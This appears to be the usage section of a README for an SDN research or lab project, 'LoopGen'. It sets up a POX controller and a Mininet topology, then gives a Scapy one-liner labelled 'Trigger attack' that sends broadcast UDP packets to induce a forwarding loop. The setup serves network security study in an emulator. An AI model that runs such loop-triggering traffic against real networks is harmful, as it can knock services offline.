## Usage
Start the controller
```bash
./pox.py log.level --DEBUG openflow.of_01 --port=6633 forwarding.l3_learning
```

Start mininet topology
```bash
sudo mn -c
sudo python3 -E LoopGen_topo_l3.py
```

Open the host terminal
```bash
mininet> xterm h1 h2 h3
```

Send packets in each host terminal
```bash
# Node: h1
python3 LoopGen_packets_l3.py h1-eth0 10.0.0.2
# Node: h2
python3 LoopGen_packets_l3.py h2-eth0 10.0.0.3
# Node: h3
python3 LoopGen_packets_l3.py h3-eth0 10.0.0.1
```

Trigger attack
```bash
mininet> h1 python3 -c "from scapy.all import sendp, Ether, IP, UDP; print('Triggering Loop...'); sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/IP(dst='10.0.0.8')/UDP(dport=9999, sport=1234), iface='h1-eth0', count=7, inter=0.5)"
```
